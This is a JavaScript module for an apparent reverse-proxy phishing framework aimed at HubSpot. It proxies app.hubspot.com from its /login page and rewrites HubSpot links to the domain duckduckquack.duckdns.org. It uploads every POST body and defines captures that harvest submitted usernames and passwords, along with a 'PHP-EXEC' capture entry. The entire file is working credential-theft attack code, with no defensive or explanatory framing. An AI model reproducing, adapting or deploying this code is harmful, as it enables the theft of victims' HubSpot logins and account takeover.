/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()
    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
            {
                reg: /\/\/static.hsappstatic.net/gi,
                replacement: '/staticApp'
            },
            {
                reg: /hubspot.com/gi,
                replacement: 'duckduckquack.duckdns.org'
            }
        ]
    }


    processResponse() {
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            clientContext.setLogAvailable(true)
            super.uploadRequestBody(clientContext.currentDomain, clientContext)
        }

        if (this.req.url.startsWith('/staticApp')) {
            this.req.url = this.req.url.slice(10)
            return super.superExecuteProxy('static.hsappstatic.net', clientContext)
        }
        
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
    }
}


const configExport = {
    CURRENT_DOMAIN: 'app.hubspot.com',
    
    EXTERNAL_FILTERS: 
    [
        'api.hubspot.com',
        'static.hsappstatic.net'
    ],


    START_PATH: '/login',

    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['app.hubspot.com'],
        },
        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: ['app.hubspot.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

}
module.exports = configExport